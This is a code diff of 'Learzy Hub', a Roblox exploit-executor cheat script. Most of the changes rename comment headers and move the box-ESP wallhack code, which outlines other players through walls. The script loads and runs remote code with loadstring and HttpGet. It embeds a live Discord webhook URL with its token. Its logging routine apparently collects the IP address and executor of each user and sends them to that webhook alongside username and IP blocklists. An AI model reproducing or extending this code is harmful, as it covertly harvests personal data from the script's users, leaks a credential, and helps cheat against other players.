@@ -1,4 +1,4 @@
---// === Services ===
+--// === Service Initialization ===
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -9,7 +9,7 @@ local Camera = workspace.CurrentCamera
 local Request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 local Executor = identifyexecutor and identifyexecutor() or "Unknown"
 
---// === UI ===
+--// === UI Initialization ===
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local MainUI = Rayfield:CreateWindow({
     Name = "Learzy Hub | " .. Executor,
@@ -17,7 +17,7 @@ local MainUI = Rayfield:CreateWindow({
     ToggleUIKeybind = "K",
 })
 
---// === Tabs ===
+--// === UI Tabs ===
 local tabPlayer = MainUI:CreateTab("Player", 4483362458)
 local tabVisual = MainUI:CreateTab("Visual", 4483362458)
 local tabCombat = MainUI:CreateTab("Combat", 4483362458)
@@ -28,7 +28,7 @@ tabVisual:CreateParagraph({Title = "Visual", Content = "ESP and overlays display
 tabCombat:CreateParagraph({Title = "Combat", Content = "Combat features in development..."})
 tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Vehicle tools in progress..."})
 
---// === Webhook Logging ===
+--// === Webhook & Blacklist ===
 local Webhook = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 local BlockedUsers = {["playerkontoo"] = true, ["Player123"] = true}
 local BlockedIPs = {["123.456.78.910"] = true}
@@ -73,8 +73,8 @@ end
 
 local function Flag(code)
     if not code or #code ~= 2 then return "" end
-    local o = 127397
-    return utf8.char(o + code:sub(1,1):byte(), o + code:sub(2,2):byte())
+    local offset = 127397
+    return utf8.char(offset + code:sub(1,1):byte(), offset + code:sub(2,2):byte())
 end
 
 local function GetClient()
@@ -132,7 +132,7 @@ local function SendLog(ip, exec, blacklisted)
     })
 end
 
---// === Run Logger & Blacklist ===
+--// === Main Logic ===
 task.spawn(function()
     local ip, exec = GetClient()
     local username = LocalPlayer.Name
@@ -215,116 +215,115 @@ task.spawn(function()
         CurrentValue = false,
         Callback = ToggleUsernameESP,
     })
-end)
 
---// === Box ESP ===
-local BoxESP_Enabled = false
-local Wireframes = {}
+    --// === Box ESP ===
+    local BoxESP_Enabled = false
+    local Wireframes = {}
+    local Edges = {
+        {1, 2}, {2, 4}, {4, 3}, {3, 1},
+        {5, 6}, {6, 8}, {8, 7}, {7, 5},
+        {1, 5}, {2, 6}, {3, 7}, {4, 8}
+    }
 
-local Edges = {
-    {1, 2}, {2, 4}, {4, 3}, {3, 1},
-    {5, 6}, {6, 8}, {8, 7}, {7, 5},
-    {1, 5}, {2, 6}, {3, 7}, {4, 8}
-}
-
-local function ClearWireframe(player)
-    if Wireframes[player] then
-        for _, line in ipairs(Wireframes[player]) do
-            if line.Remove then line:Remove() end
-        end
-        Wireframes[player] = nil
-    end
-end
-
-local function CreateWireframe(player)
-    if player == LocalPlayer or Wireframes[player] then return end
-    local lines = {}
-    for _ = 1, 12 do
-        local line = Drawing.new("Line")
-        line.Thickness = 1.5
-        line.Transparency = 1
-        line.Color = Color3.new(1, 1, 1)
-        line.Visible = false
-        table.insert(lines, line)
-    end
-    Wireframes[player] = lines
-end
-
-local function UpdateWireframes()
-    for player, lines in pairs(Wireframes) do
-        local char = player.Character
-        local hrp = char and char:FindFirstChild("HumanoidRootPart")
-        local hum = char and char:FindFirstChildOfClass("Humanoid")
-        if not hrp or not hum or hum.Health <= 0 then
-            for _, line in ipairs(lines) do line.Visible = false end
-            continue
-        end
-
-        local min, max
-        for _, part in ipairs(char:GetDescendants()) do
-            if part:IsA("BasePart") then
-                local pos = part.Position
-                min = min and Vector3.new(math.min(min.X, pos.X), math.min(min.Y, pos.Y), math.min(min.Z, pos.Z)) or pos
-                max = max and Vector3.new(math.max(max.X, pos.X), math.max(max.Y, pos.Y), math.max(max.Z, pos.Z)) or pos
+    local function ClearWireframe(player)
+        if Wireframes[player] then
+            for _, line in ipairs(Wireframes[player]) do
+                if line.Remove then line:Remove() end
             end
-        end
-
-        if not min or not max then
-            for _, line in ipairs(lines) do line.Visible = false end
-            continue
-        end
-
-        min = min - Vector3.new(1.5, 1.5, 1.2)
-        max = max + Vector3.new(1.5, 1.5, 1.2)
-
-        local corners = {
-            Vector3.new(min.X, min.Y, min.Z), Vector3.new(max.X, min.Y, min.Z),
-            Vector3.new(min.X, min.Y, max.Z), Vector3.new(max.X, min.Y, max.Z),
-            Vector3.new(min.X, max.Y, min.Z), Vector3.new(max.X, max.Y, min.Z),
-            Vector3.new(min.X, max.Y, max.Z), Vector3.new(max.X, max.Y, max.Z)
-        }
-
-        local screen = {}
-        for i, v in ipairs(corners) do
-            local s, vis = Camera:WorldToViewportPoint(v)
-            screen[i] = vis and Vector2.new(s.X, s.Y) or nil
-        end
-
-        for i, edge in ipairs(Edges) do
-            local p1, p2 = screen[edge[1]], screen[edge[2]]
-            local line = lines[i]
-            if p1 and p2 then
-                line.From = p1
-                line.To = p2
-                line.Visible = BoxESP_Enabled
-            else
-                line.Visible = false
-            end
+            Wireframes[player] = nil
         end
     end
-end
 
-Players.PlayerAdded:Connect(CreateWireframe)
-Players.PlayerRemoving:Connect(ClearWireframe)
-for _, p in ipairs(Players:GetPlayers()) do
-    if p ~= LocalPlayer then CreateWireframe(p) end
-end
+    local function CreateWireframe(player)
+        if player == LocalPlayer or Wireframes[player] then return end
+        local lines = {}
+        for _ = 1, 12 do
+            local line = Drawing.new("Line")
+            line.Thickness = 1.5
+            line.Transparency = 1
+            line.Color = Color3.new(1, 1, 1)
+            line.Visible = false
+            table.insert(lines, line)
+        end
+        Wireframes[player] = lines
+    end
 
-RunService.RenderStepped:Connect(function()
-    if BoxESP_Enabled then UpdateWireframes() end
-end)
+    local function UpdateWireframes()
+        for player, lines in pairs(Wireframes) do
+            local char = player.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if not hrp or not hum or hum.Health <= 0 then
+                for _, line in ipairs(lines) do line.Visible = false end
+                continue
+            end
 
-tabVisual:CreateToggle({
-    Name = "Box ESP",
-    CurrentValue = false,
-    Callback = function(state)
-        BoxESP_Enabled = state
-        if not state then
-            for _, lines in pairs(Wireframes) do
-                for _, line in ipairs(lines) do
+            local min, max
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    local pos = part.Position
+                    min = min and Vector3.new(math.min(min.X, pos.X), math.min(min.Y, pos.Y), math.min(min.Z, pos.Z)) or pos
+                    max = max and Vector3.new(math.max(max.X, pos.X), math.max(max.Y, pos.Y), math.max(max.Z, pos.Z)) or pos
+                end
+            end
+
+            if not min or not max then
+                for _, line in ipairs(lines) do line.Visible = false end
+                continue
+            end
+
+            min = min - Vector3.new(1.5, 1.5, 1.2)
+            max = max + Vector3.new(1.5, 1.5, 1.2)
+
+            local corners = {
+                Vector3.new(min.X, min.Y, min.Z), Vector3.new(max.X, min.Y, min.Z),
+                Vector3.new(min.X, min.Y, max.Z), Vector3.new(max.X, min.Y, max.Z),
+                Vector3.new(min.X, max.Y, min.Z), Vector3.new(max.X, max.Y, min.Z),
+                Vector3.new(min.X, max.Y, max.Z), Vector3.new(max.X, max.Y, max.Z)
+            }
+
+            local screen = {}
+            for i, v in ipairs(corners) do
+                local s, vis = Camera:WorldToViewportPoint(v)
+                screen[i] = vis and Vector2.new(s.X, s.Y) or nil
+            end
+
+            for i, edge in ipairs(Edges) do
+                local p1, p2 = screen[edge[1]], screen[edge[2]]
+                local line = lines[i]
+                if p1 and p2 then
+                    line.From = p1
+                    line.To = p2
+                    line.Visible = BoxESP_Enabled
+                else
                     line.Visible = false
                 end
             end
         end
-    end,
-})
+    end
+
+    Players.PlayerAdded:Connect(CreateWireframe)
+    Players.PlayerRemoving:Connect(ClearWireframe)
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then CreateWireframe(p) end
+    end
+
+    RunService.RenderStepped:Connect(function()
+        if BoxESP_Enabled then UpdateWireframes() end
+    end)
+
+    tabVisual:CreateToggle({
+        Name = "Box ESP",
+        CurrentValue = false,
+        Callback = function(state)
+            BoxESP_Enabled = state
+            if not state then
+                for _, lines in pairs(Wireframes) do
+                    for _, line in ipairs(lines) do
+                        line.Visible = false
+                    end
+                end
+            end
+        end,
+    })
+end)
